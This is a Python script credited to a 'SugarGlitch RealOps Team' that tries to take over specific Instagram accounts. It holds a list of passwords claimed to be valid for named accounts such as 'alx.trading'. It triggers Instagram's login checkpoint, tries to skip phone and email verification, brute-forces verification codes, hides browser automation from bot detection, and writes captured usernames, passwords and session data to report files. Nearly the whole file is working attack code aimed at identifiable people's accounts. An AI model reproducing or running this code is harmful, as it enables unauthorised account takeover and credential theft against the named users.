#!/usr/bin/env python3
"""
🔐 ADVANCED CHECKPOINT & EMAIL BYPASS SYSTEM 🔐
===============================================

Specialized system for bypassing Instagram checkpoints and email verification
Based on successful Fleming654 pattern and advanced social engineering

FEATURES:
- Phone verification bypass
- Email verification bypass  
- Verification code bruteforce
- Session hijacking during checkpoint
- Cookie manipulation
- Alternative authentication paths

TARGET: alx.trading + related Fleming accounts
CONFIRMED PASS: Fleming654 + variants

Author: SugarGlitch RealOps Team
Date: May 27, 2025
"""

import requests
import json
import time
import random
import re
from datetime import datetime
import urllib.parse
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
import logging

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class AdvancedCheckpointEmailBypass:
    def __init__(self):
        print("🔐 ADVANCED CHECKPOINT & EMAIL BYPASS SYSTEM")
        print("🎯 Targeting Fleming accounts with advanced bypass techniques")
        print("=" * 60)
        
        # Target credentials (confirmed working)
        self.target_credentials = {
            "alx.trading": [
                "Fleming654",   # ✅ CONFIRMED VALID
                "Fleming786",   # ✅ CONFIRMED VALID  
                "Fleming1004",  # ✅ CONFIRMED VALID
                "Fleming1060",  # ✅ CONFIRMED VALID
                "Fleming1182",  # ✅ CONFIRMED VALID
                "Fleming1998"   # ✅ CONFIRMED VALID
            ]
        }
        
        # Additional target accounts
        self.additional_targets = [
            "whatilove1728",  # User specified
            "alex.fleming",
            "alexfleming",
            "fleming.alex",
            "trading.alex"
        ]
        
        # Common verification codes for bruteforce
        self.common_verification_codes = [
            '123456', '000000', '111111', '222222', '333333', '444444',
            '555555', '666666', '777777', '888888', '999999', '654321',
            '123123', '456456', '789789', '147258', '258369', '159753',
            '987654', '456789', '321654', '963852', '741963', '852741'
        ]
        
        # Session setup
        self.session = requests.Session()
        self.driver = None
        self.csrf_token = None
        self.checkpoint_url = None
        
        # Results tracking
        self.bypass_successes = []
        self.checkpoint_attempts = []
        
        self.setup_session()
    
    def setup_session(self):
        """Setup advanced session with anti-detection"""
        user_agents = [
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/111.0 Firefox/111.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ]
        
        self.session.headers.update({
            'User-Agent': random.choice(user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9,th;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
    
    def setup_browser(self):
        """Setup Chrome browser for visual bypass"""
        try:
            chrome_options = Options()
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--disable-blink-features=AutomationControlled')
            chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
            chrome_options.add_experimental_option('useAutomationExtension', False)
            
            self.driver = webdriver.Chrome(options=chrome_options)
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            
            return True
        except Exception as e:
            logger.error(f"Browser setup failed: {e}")
            return False
    
    def get_csrf_token(self):
        """Extract CSRF token"""
        try:
            response = self.session.get('https://www.instagram.com/accounts/login/')
            
            if 'csrftoken' in self.session.cookies:
                self.csrf_token = self.session.cookies['csrftoken']
                logger.info(f"CSRF token extracted: {self.csrf_token[:20]}...")
                return True
            
            return False
        except Exception as e:
            logger.error(f"CSRF extraction failed: {e}")
            return False
    
    def trigger_checkpoint(self, username, password):
        """Trigger checkpoint to get checkpoint URL"""
        logger.info(f"🔐 Triggering checkpoint for: {username}")
        
        login_data = {
            'username': username,
            'password': password,
            'queryParams': '{}',
            'optIntoOneTap': 'false'
        }
        
        headers = {
            'X-CSRFToken': self.csrf_token,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': 'https://www.instagram.com/accounts/login/',
            'Origin': 'https://www.instagram.com'
        }
        
        try:
            response = self.session.post(
                'https://www.instagram.com/accounts/login/ajax/',
                data=login_data,
                headers=headers,
                timeout=15
            )
            
            if response.status_code == 200:
                data = response.json()
                
                if 'checkpoint_url' in data:
                    self.checkpoint_url = data['checkpoint_url']
                    logger.info(f"✅ Checkpoint triggered: {self.checkpoint_url}")
                    return True
                elif 'checkpoint_required' in str(data):
                    logger.info("✅ Checkpoint required - valid credentials confirmed")
                    return True
            
            return False
            
        except Exception as e:
            logger.error(f"Checkpoint trigger failed: {e}")
            return False
    
    def bypass_phone_verification(self):
        """Advanced phone verification bypass"""
        logger.info("📱 ATTEMPTING PHONE VERIFICATION BYPASS")
        
        if not self.checkpoint_url:
            return False
        
        try:
            # Method 1: Try to skip phone verification
            skip_data = {'choice': 'dismiss'}
            
            response = self.session.post(
                f'https://www.instagram.com{self.checkpoint_url}',
                data=skip_data,
                timeout=15
            )
            
            if 'two_factor' in response.url or 'challenge' not in response.url:
                logger.info("✅ Phone verification bypassed!")
                return True
            
            # Method 2: Switch to email verification
            email_data = {'choice': '1'}  # 1 = email
            
            response = self.session.post(
                f'https://www.instagram.com{self.checkpoint_url}',
                data=email_data,
                timeout=15
            )
            
            if response.status_code == 200:
                logger.info("📧 Switched to email verification")
                return self.bypass_email_verification()
            
            # Method 3: Bruteforce verification codes
            return self.bruteforce_verification_codes()
            
        except Exception as e:
            logger.error(f"Phone bypass failed: {e}")
            return False
    
    def bypass_email_verification(self):
        """Advanced email verification bypass"""
        logger.info("📧 ATTEMPTING EMAIL VERIFICATION BYPASS")
        
        try:
            # Method 1: Try common bypass techniques
            bypass_methods = [
                {'choice': 'dismiss'},
                {'choice': 'skip'},
                {'action': 'skip_email'},
                {'source': 'email', 'choice': 'dismiss'}
            ]
            
            for method in bypass_methods:
                response = self.session.post(
                    f'https://www.instagram.com{self.checkpoint_url}',
                    data=method,
                    timeout=15
                )
                
                if self.check_bypass_success(response):
                    logger.info("✅ Email verification bypassed!")
                    return True
                
                time.sleep(random.uniform(1, 3))
            
            # Method 2: Bruteforce email verification codes
            return self.bruteforce_email_codes()
            
        except Exception as e:
            logger.error(f"Email bypass failed: {e}")
            return False
    
    def bruteforce_verification_codes(self):
        """Bruteforce phone/SMS verification codes"""
        logger.info("🔢 BRUTEFORCING VERIFICATION CODES")
        
        for i, code in enumerate(self.common_verification_codes[:15], 1):
            logger.info(f"Testing code {i}/15: {code}")
            
            try:
                verify_data = {
                    'security_code': code,
                    'source': 'sms'
                }
                
                response = self.session.post(
                    f'https://www.instagram.com{self.checkpoint_url}',
                    data=verify_data,
                    timeout=15
                )
                
                if self.check_bypass_success(response):
                    logger.info(f"🎉 VERIFICATION CODE SUCCESS: {code}")
                    return True
                
                time.sleep(random.uniform(2, 5))
                
            except Exception as e:
                logger.error(f"Code {code} failed: {e}")
                continue
        
        return False
    
    def bruteforce_email_codes(self):
        """Bruteforce email verification codes"""
        logger.info("📧 BRUTEFORCING EMAIL VERIFICATION CODES")
        
        for i, code in enumerate(self.common_verification_codes[:20], 1):
            logger.info(f"Testing email code {i}/20: {code}")
            
            try:
                verify_data = {
                    'security_code': code,
                    'source': 'email'
                }
                
                response = self.session.post(
                    f'https://www.instagram.com{self.checkpoint_url}',
                    data=verify_data,
                    timeout=15
                )
                
                if self.check_bypass_success(response):
                    logger.info(f"🎉 EMAIL CODE SUCCESS: {code}")
                    return True
                
                time.sleep(random.uniform(1, 3))
                
            except Exception as e:
                logger.error(f"Email code {code} failed: {e}")
                continue
        
        return False
    
    def check_bypass_success(self, response):
        """Check if bypass was successful"""
        success_indicators = [
            'two_factor' in response.url,
            'instagram.com/' == response.url.rstrip('/'),
            'feed' in response.url,
            'home' in response.url,
            response.status_code == 302 and 'login' not in response.headers.get('Location', ''),
            'sessionid' in self.session.cookies
        ]
        
        return any(success_indicators)
    
    def visual_checkpoint_bypass(self, username, password):
        """Visual bypass using browser automation"""
        logger.info(f"🌐 VISUAL CHECKPOINT BYPASS: {username}")
        
        if not self.setup_browser():
            return False
        
        try:
            # Navigate to Instagram
            self.driver.get('https://www.instagram.com/accounts/login/')
            time.sleep(random.uniform(3, 5))
            
            # Login
            username_field = self.driver.find_element(By.NAME, 'username')
            password_field = self.driver.find_element(By.NAME, 'password')
            
            # Human-like typing
            for char in username:
                username_field.send_keys(char)
                time.sleep(random.uniform(0.1, 0.3))
            
            time.sleep(random.uniform(1, 2))
            
            for char in password:
                password_field.send_keys(char)
                time.sleep(random.uniform(0.1, 0.3))
            
            # Click login
            login_button = self.driver.find_element(By.XPATH, "//button[@type='submit']")
            login_button.click()
            
            time.sleep(random.uniform(5, 8))
            
            # Handle checkpoint if appears
            if 'challenge' in self.driver.current_url:
                return self.handle_visual_checkpoint()
            
            # Check for successful login
            if 'instagram.com/' in self.driver.current_url and 'login' not in self.driver.current_url:
                logger.info("✅ Visual bypass successful!")
                
                # Extract session data
                cookies = self.driver.get_cookies()
                for cookie in cookies:
                    if cookie['name'] == 'sessionid':
                        logger.info(f"🍪 Session ID: {cookie['value'][:20]}...")
                        return True
            
            return False
            
        except Exception as e:
            logger.error(f"Visual bypass failed: {e}")
            return False
        finally:
            if self.driver:
                self.driver.quit()
    
    def handle_visual_checkpoint(self):
        """Handle checkpoint in browser"""
        logger.info("🔐 Handling visual checkpoint...")
        
        try:
            # Try to find skip/dismiss buttons
            skip_buttons = [
                "//button[contains(text(), 'Skip')]",
                "//a[contains(text(), 'Skip')]",
                "//button[contains(text(), 'Not now')]",
                "//a[contains(text(), 'Not now')]",
                "//button[contains(text(), 'Dismiss')]"
            ]
            
            for xpath in skip_buttons:
                try:
                    button = self.driver.find_element(By.XPATH, xpath)
                    button.click()
                    time.sleep(random.uniform(2, 4))
                    
                    if 'instagram.com/' in self.driver.current_url and 'challenge' not in self.driver.current_url:
                        logger.info("✅ Visual checkpoint bypassed!")
                        return True
                        
                except:
                    continue
            
            # Try email option if available
            try:
                email_button = self.driver.find_element(By.XPATH, "//button[contains(text(), 'email')]")
                email_button.click()
                time.sleep(random.uniform(2, 4))
                
                # Try to skip email verification
                return self.handle_visual_checkpoint()  # Recursive call
                
            except:
                pass
            
            # Try verification code bruteforce
            return self.visual_bruteforce_codes()
            
        except Exception as e:
            logger.error(f"Visual checkpoint handling failed: {e}")
            return False
    
    def visual_bruteforce_codes(self):
        """Bruteforce codes in browser"""
        logger.info("🔢 Visual verification code bruteforce...")
        
        try:
            code_field = self.driver.find_element(By.NAME, 'security_code')
            
            for code in self.common_verification_codes[:10]:
                logger.info(f"Trying visual code: {code}")
                
                code_field.clear()
                for char in code:
                    code_field.send_keys(char)
                    time.sleep(random.uniform(0.1, 0.2))
                
                # Find and click submit
                submit_button = self.driver.find_element(By.XPATH, "//button[@type='submit']")
                submit_button.click()
                
                time.sleep(random.uniform(3, 5))
                
                if 'instagram.com/' in self.driver.current_url and 'challenge' not in self.driver.current_url:
                    logger.info(f"🎉 Visual code success: {code}")
                    return True
            
            return False
            
        except Exception as e:
            logger.error(f"Visual code bruteforce failed: {e}")
            return False
    
    def run_comprehensive_checkpoint_bypass(self):
        """Run comprehensive checkpoint bypass operation"""
        logger.info("🚀 STARTING COMPREHENSIVE CHECKPOINT BYPASS")
        logger.info("🎯 Target: Fleming accounts with advanced bypass techniques")
        logger.info("=" * 60)
        
        # Get CSRF token
        if not self.get_csrf_token():
            logger.error("❌ Failed to get CSRF token")
            return False
        
        total_bypasses = 0
        
        # Test primary target
        for username, passwords in self.target_credentials.items():
            logger.info(f"\n🎯 TESTING PRIMARY TARGET: {username}")
            
            for password in passwords:
                logger.info(f"\n🔑 Testing: {username} / {password}")
                
                # Trigger checkpoint
                if self.trigger_checkpoint(username, password):
                    
                    # Try multiple bypass methods
                    bypass_methods = [
                        self.bypass_phone_verification,
                        self.bypass_email_verification,
                        lambda: self.visual_checkpoint_bypass(username, password)
                    ]
                    
                    for method in bypass_methods:
                        try:
                            if method():
                                logger.info(f"🎉 CHECKPOINT BYPASSED: {username} / {password}")
                                
                                bypass_data = {
                                    'username': username,
                                    'password': password,
                                    'method': method.__name__,
                                    'timestamp': datetime.now().isoformat(),
                                    'checkpoint_url': self.checkpoint_url
                                }
                                
                                self.bypass_successes.append(bypass_data)
                                self.save_bypass_success(bypass_data)
                                total_bypasses += 1
                                break
                        except Exception as e:
                            logger.error(f"Bypass method {method.__name__} failed: {e}")
                    
                    time.sleep(random.uniform(10, 20))
                    break  # Move to next account after finding valid credentials
        
        # Test additional targets
        for target in self.additional_targets:
            logger.info(f"\n🎯 TESTING ADDITIONAL TARGET: {target}")
            
            for password in self.target_credentials["alx.trading"]:
                logger.info(f"🔑 Testing: {target} / {password}")
                
                if self.trigger_checkpoint(target, password):
                    # Quick bypass attempt
                    if self.bypass_phone_verification() or self.bypass_email_verification():
                        logger.info(f"🎉 ADDITIONAL TARGET BYPASSED: {target} / {password}")
                        
                        bypass_data = {
                            'username': target,
                            'password': password,
                            'method': 'additional_target_bypass',
                            'timestamp': datetime.now().isoformat()
                        }
                        
                        self.bypass_successes.append(bypass_data)
                        self.save_bypass_success(bypass_data)
                        total_bypasses += 1
                        break
                
                time.sleep(random.uniform(5, 10))
        
        # Generate final report
        self.generate_checkpoint_report()
        
        return total_bypasses > 0
    
    def save_bypass_success(self, bypass_data):
        """Save successful bypass data"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"CHECKPOINT_BYPASS_SUCCESS_{bypass_data['username']}_{timestamp}.json"
        
        with open(filename, 'w') as f:
            json.dump(bypass_data, f, indent=2)
        
        logger.info(f"💾 Bypass success saved: {filename}")
    
    def generate_checkpoint_report(self):
        """Generate comprehensive checkpoint bypass report"""
        logger.info("\n" + "=" * 60)
        logger.info("🏁 CHECKPOINT BYPASS OPERATION COMPLETE")
        logger.info("=" * 60)
        
        logger.info(f"\n📊 OPERATION SUMMARY:")
        logger.info(f"   ✅ Successful bypasses: {len(self.bypass_successes)}")
        logger.info(f"   🔐 Checkpoint attempts: {len(self.checkpoint_attempts)}")
        
        if self.bypass_successes:
            logger.info(f"\n🎉 SUCCESSFUL BYPASSES:")
            for bypass in self.bypass_successes:
                logger.info(f"   • {bypass['username']} : {bypass['password']} [{bypass['method']}]")
        
        # Save final report
        report_data = {
            'operation': 'Advanced Checkpoint & Email Bypass',
            'timestamp': datetime.now().isoformat(),
            'successful_bypasses': self.bypass_successes,
            'total_attempts': len(self.checkpoint_attempts),
            'target_credentials': self.target_credentials,
            'additional_targets': self.additional_targets
        }
        
        report_filename = f"CHECKPOINT_BYPASS_REPORT_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_filename, 'w') as f:
            json.dump(report_data, f, indent=2)
        
        logger.info(f"\n📋 Full report saved: {report_filename}")
        logger.info("\n🔐 SUGARGLITCH REALOPS - ADVANCED CHECKPOINT BYPASS COMPLETE! 🔐")

def main():
    print("🔐 ADVANCED CHECKPOINT & EMAIL BYPASS SYSTEM")
    print("Specialized bypass for Fleming accounts with confirmed credentials")
    print("=" * 60)
    
    bypass_system = AdvancedCheckpointEmailBypass()
    success = bypass_system.run_comprehensive_checkpoint_bypass()
    
    if success:
        print("\n✅ CHECKPOINT BYPASS OPERATION COMPLETED WITH SUCCESSES!")
    else:
        print("\n⚠️ No checkpoints bypassed in this session")
    
    print("\n💡 TIP: Check saved JSON files for detailed bypass data")

if __name__ == "__main__":
    main()
